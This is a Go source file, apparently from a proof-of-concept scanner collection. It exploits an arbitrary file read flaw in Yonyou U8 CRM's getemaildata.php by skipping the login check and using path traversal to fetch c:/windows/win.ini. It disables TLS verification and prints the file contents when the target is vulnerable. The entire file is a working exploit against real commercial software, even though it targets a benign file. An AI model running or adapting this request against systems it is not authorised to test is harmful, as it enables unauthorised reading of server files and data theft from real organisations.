package poc

import (
	"PocSir/config"
	"crypto/tls"
	"io"
	"net/http"
)

func U8CRM_pathTravel_exp(target string) {
	pocUrl := target + "/ajax/getemaildata.php?DontCheckLogin=1&filePath=c:/windows/win.ini"
	req, err := http.NewRequest("GET", pocUrl, nil)
	if err != nil {
		config.ErrMsg.Printf("[-]%v\n", err)
	}
	tr := &http.Transport{
		TLSClientConfig: &tls.Config{
			InsecureSkipVerify: true,
		},
	}
	client := &http.Client{
		Transport: tr,
	}
	resp, err := client.Do(req)
	if err != nil {
		config.ErrMsg.Printf("[-]%v\n", err)
	}
	defer resp.Body.Close()

	read, err := io.ReadAll(resp.Body)
	if err != nil {
		config.ErrMsg.Printf("[-]%v\n", err)
	}
	if resp.StatusCode == 200 {
		config.Right.Println("[+]存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞")
		config.TextPut.Printf("[+]win.ini内容: %s\n", string(read))
	} else {
		config.ErrMsg.Printf("[-]不存在用友 U8 CRM客户关系管理系统 getemaildata.php 任意文件读取漏洞\n")
	}
}
